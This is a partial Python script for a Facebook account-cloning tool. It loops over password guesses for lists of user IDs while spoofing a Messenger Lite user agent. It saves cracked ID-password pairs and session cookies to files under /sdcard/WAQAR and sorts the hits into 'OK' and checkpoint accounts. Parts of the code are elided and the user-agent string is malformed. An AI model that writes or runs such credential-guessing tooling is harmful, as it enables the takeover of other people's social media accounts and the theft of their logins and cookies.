...
class System:
    ...
    def menu(self):
        try:
            os.makedirs('/sdcard/WAQAR')
        except:
            pass
        os.system('clear')
        print(self.logo)
        print(f' ({green}1{reset}) File Cloning')
        print(f' ({green}2{reset}) Join Wattsap Group')
        print(47 * '-')
    ...
    def cloning_process(self):
        os.system('clear')
        print(logo)
        print(f' ({green}•{reset}) Accounts save in /sdcard/WAQAR')
        print(47*'-')
    ...
    def cloning(self,uid,first,last):
        ...
        fbbd = 'Samsung'
        user_agent = "Davik/2.1.0 (Linux; U; Android 12; Infinix X6817 Build/SP1A.210812.016) [FBAN/MessengerLite;FBAV/318.0.0.2.59;FBPN/com.facebook.mlite;FBLC/en;FBBV/671412250;FBCR/Telenor;FBMF/INFINIX;FBBD/Infinix;FBDV/Infinix X6817;FBSV/12;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width'+Davik/2.1.0 (Linux; U; Android 12; Infinix X6817 Build/SP1A.210812.016) [FBAN/MessengerLite;FBAV/300.0.0.5.118;FBPN/com.facebook.mlite;FBLC/en;FBBV/868417217;FBCR/Telenor;FBMF/INFINIX;FBBD/Infinix;FBDV/Infinix X6817;FBSV/12;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width:]"
        for pw in self.passwords:
            try:
                ...
                if "session_key" in response:
                    ...
                    print(f'\r{greenn} [WAQAR-OK] {uid} | {pw} {reset}')
                    open('/sdcard/WAQAR/WAQAR-ok-with-cookies.txt','a').write(str(uid_pw))
                    open('/sdcard/WAQAR/WAQAR-ok.txt','a').write(f'{uid}|{pw}\n')
                    self.oku.append(uid)
                    break
                elif "User must verify their account" in response:
                    print(f'\r{blue} [WAQAR-CP] {uid} | {pw} {reset}')
                    open('/sdcard/WAQAR/WAQAR-cp.txt','a').write(f'{uid}|{pw}\n')
                    self.cpu.append(uid)
                    break
                else:
                    continue
...
if __name__ == "__main__":
    ...
    os.system('xdg-open https://www.facebook.com/profile.php?id=100018966831458')
    #time.sleep(5)
    logo = f'''
